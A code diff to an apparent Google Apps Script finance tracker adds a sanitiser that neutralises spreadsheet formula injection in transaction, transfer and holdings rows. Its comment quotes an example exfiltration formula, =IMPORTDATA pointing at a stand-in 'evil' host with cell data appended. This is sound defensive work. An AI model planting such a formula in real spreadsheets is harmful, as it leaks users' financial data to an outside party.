@@ -118,19 +118,27 @@ function getAllTransactions_() {
   });
 }
 
+/** Text that starts with = + - or @ would be run by Sheets as a formula (for example
+ *  =IMPORTDATA("https://evil/?"&A1) typed into a description or printed on a receipt).
+ *  A leading apostrophe stores it as plain text instead. Numbers and Dates pass through. */
+function safeCell_(v) {
+  if (typeof v !== 'string') return v;
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
+
 function addTransaction_(b) {
   var sh = getSheet_();
   var id = 'TXN-' + new Date().getTime();   // unique, time-based id
   var row = [
     id,
-    b.date || formatDate_(new Date()),
-    b.type,                                  // income | expense | invest
-    b.category || 'Other',
-    b.description || '',
+    safeCell_(b.date || formatDate_(new Date())),
+    safeCell_(b.type),                       // income | expense | invest
+    safeCell_(b.category || 'Other'),
+    safeCell_(b.description || ''),
     Number(b.amount) || 0,
-    b.source || 'web',                       // web | telegram | whatsapp | ocr
+    safeCell_(b.source || 'web'),            // web | telegram | whatsapp | ocr
     new Date(),
-    b.account || ''                          // AccountA | AccountB (blank = unassigned)
+    safeCell_(b.account || '')               // AccountA | AccountB (blank = unassigned)
   ];
   sh.appendRow(row);
   return { id: id };
@@ -142,7 +150,7 @@ function addTransfer_(b) {
   // while per-account balances still net correctly.
   var sh = getSheet_();
   var amount = Number(b.amount) || 0;
-  var date = b.date || formatDate_(new Date());
+  var date = safeCell_(b.date || formatDate_(new Date()));
   var note = b.description || '';
   var pairId = new Date().getTime();
   var outId = 'TRF-' + pairId + '-OUT';
@@ -150,12 +158,12 @@ function addTransfer_(b) {
 
   // OUT leg (debits the 'from' account) - behaves like an expense for balances
   sh.appendRow([outId, date, 'transfer-out', 'Transfer',
-    'To ' + b.toAccount + (note ? ' - ' + note : ''),
-    amount, b.source || 'web', new Date(), b.fromAccount || '']);
+    safeCell_('To ' + b.toAccount + (note ? ' - ' + note : '')),
+    amount, safeCell_(b.source || 'web'), new Date(), safeCell_(b.fromAccount || '')]);
   // IN leg (credits the 'to' account) - behaves like income for balances
   sh.appendRow([inId, date, 'transfer-in', 'Transfer',
-    'From ' + b.fromAccount + (note ? ' - ' + note : ''),
-    amount, b.source || 'web', new Date(), b.toAccount || '']);
+    safeCell_('From ' + b.fromAccount + (note ? ' - ' + note : '')),
+    amount, safeCell_(b.source || 'web'), new Date(), safeCell_(b.toAccount || '')]);
 
   return { outId: outId, inId: inId, amount: amount };
 }
@@ -300,12 +308,12 @@ function addHolding_(b) {
   var sh = getHoldingsSheet_();
   var id = 'HLD-' + new Date().getTime();
   sh.appendRow([
-    String(b.assetType || '').toLowerCase().trim(),   // gold | stock
-    String(b.ticker || '').toUpperCase().trim(),       // blank for gold
-    b.name || '',
+    safeCell_(String(b.assetType || '').toLowerCase().trim()),   // gold | stock
+    safeCell_(String(b.ticker || '').toUpperCase().trim()),       // blank for gold
+    safeCell_(b.name || ''),
     Number(b.quantity) || 0,                           // grams (gold) or shares
     Number(b.buyPrice) || 0,                           // per gram / per share
-    b.buyDate || formatDate_(new Date()),
+    safeCell_(b.buyDate || formatDate_(new Date())),
     id
   ]);
   return { id: id };
@@ -426,8 +434,8 @@ function sellHolding_(b) {
   // 3. realized P&L row
   var realizedSheet = getRealizedSheet_();
   realizedSheet.appendRow([
-    'RLZ-' + new Date().getTime(), date, assetType, ticker, name,
-    sellQty, avgBuy, sellPrice, proceeds, costBasis, realizedPl, account
+    'RLZ-' + new Date().getTime(), safeCell_(date), safeCell_(assetType), safeCell_(ticker), safeCell_(name),
+    sellQty, avgBuy, sellPrice, proceeds, costBasis, realizedPl, safeCell_(account)
   ]);
 
   return {
